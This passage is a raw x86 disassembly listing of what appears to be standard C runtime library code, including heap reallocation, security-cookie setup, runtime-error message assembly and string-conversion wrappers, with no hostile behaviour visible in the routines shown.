  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
  42587c:	mov    esi,DWORD PTR [ebp+0xc]
  42587f:	cmp    esi,ebx
  425881:	jne    0x42588f
  425883:	push   edi
  425884:	call   0x4244ba
  425889:	pop    ecx
  42588a:	jmp    0x4259fe
  42588f:	cmp    DWORD PTR ds:0x45d144,0x3
  425896:	jne    0x4259ca
  42589c:	mov    DWORD PTR [ebp-0x1c],ebx
  42589f:	cmp    esi,0xffffffe0
  4258a2:	ja     0x425999
  4258a8:	push   0x4
  4258aa:	call   0x423a6f
  4258af:	pop    ecx
  4258b0:	mov    DWORD PTR [ebp-0x4],ebx
  4258b3:	push   edi
  4258b4:	call   0x424c92
  4258b9:	pop    ecx
  4258ba:	mov    DWORD PTR [ebp-0x20],eax
  4258bd:	cmp    eax,ebx
  4258bf:	je     0x425969
  4258c5:	cmp    esi,DWORD PTR ds:0x45cf04
  4258cb:	ja     0x425919
  4258cd:	push   esi
  4258ce:	push   edi
  4258cf:	push   eax
  4258d0:	call   0x425192
  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
